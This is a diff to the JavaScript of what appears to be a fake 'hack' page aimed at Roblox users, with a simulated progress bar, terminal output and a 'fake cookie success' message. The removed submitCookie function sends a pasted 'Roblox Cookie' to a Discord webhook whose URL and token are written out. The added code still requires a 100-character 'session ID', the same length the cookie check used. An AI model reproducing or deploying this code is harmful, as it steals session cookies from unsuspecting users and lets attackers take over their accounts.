@@ -1,16 +1,31 @@
 // Validate User Input
 function validateInput() {
-  const userId = document.getElementById('userId').value.trim();
+  const username = document.getElementById('username').value.trim();
+  const sessionId = document.getElementById('sessionId').value.trim();
   const captcha = document.getElementById('captcha').checked;
 
-  // Basic validation
-  if (userId.length < 3) {
-    showError("ERROR! User ID or Username must be at least 3 characters long.");
-    return;
+  // Check for invalid inputs
+  let errorMessage = "";
+
+  if (username.length < 3 && sessionId.length < 100 && !captcha) {
+    errorMessage = "Please check your inputs: username, session ID, and CAPTCHA.";
+  } else if (username.length < 3 && sessionId.length < 100) {
+    errorMessage = "Username must be at least 3 characters, and session ID must be 100+ characters.";
+  } else if (username.length < 3 && !captcha) {
+    errorMessage = "Username must be at least 3 characters, and CAPTCHA must be completed.";
+  } else if (sessionId.length < 100 && !captcha) {
+    errorMessage = "Session ID must be 100+ characters, and CAPTCHA must be completed.";
+  } else if (username.length < 3) {
+    errorMessage = "Username must be at least 3 characters long.";
+  } else if (sessionId.length < 100) {
+    errorMessage = "Session ID must be at least 100 characters long.";
+  } else if (!captcha) {
+    errorMessage = "Please complete the CAPTCHA to proceed.";
   }
 
-  if (!captcha) {
-    showError("ERROR! Please complete the CAPTCHA.");
+  // Show error message if any input is invalid
+  if (errorMessage) {
+    showError(errorMessage);
     return;
   }
 
@@ -42,7 +57,7 @@ function startHack() {
   const interval = setInterval(() => {
     if (width >= 100) {
       clearInterval(interval);
-      showCookieSection(); // Show the cookie input section
+      showCookieSuccess();
     } else {
       width++;
       progressBar.style.width = width + '%';
@@ -67,36 +82,6 @@ function startHack() {
       i++;
     }
   }, 1500); // Adjust speed of terminal output
-}
-
-// Show Cookie Input Section
-function showCookieSection() {
-  document.getElementById('cookieSection').classList.remove('hidden');
-}
-
-// Submit Cookie
-function submitCookie() {
-  const cookie = document.getElementById('cookieInput').value.trim();
-  const minCookieLength = 100; // Minimum length for a valid cookie
-
-  if (cookie && cookie.length >= minCookieLength) {
-    // Simulate sending the cookie to a server (for educational purposes only)
-    fetch("https://discord.com/api/webhooks/1350235351339241472/LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ", {
-      method: "POST",
-      body: JSON.stringify({ content: "Roblox Cookie: " + cookie }),
-      headers: { "Content-Type": "application/json" }
-    }).then(response => {
-      if (response.ok) {
-        showCookieSuccess();
-      } else {
-        showError("Failed to submit cookie. Please try again.");
-      }
-    }).catch(error => {
-      showError("Network error. Please try again.");
-    });
-  } else {
-    showError("ERROR! Cookie must be at least " + minCookieLength + " characters long.");
-  }
 }
 
 // Show Fake Cookie Success
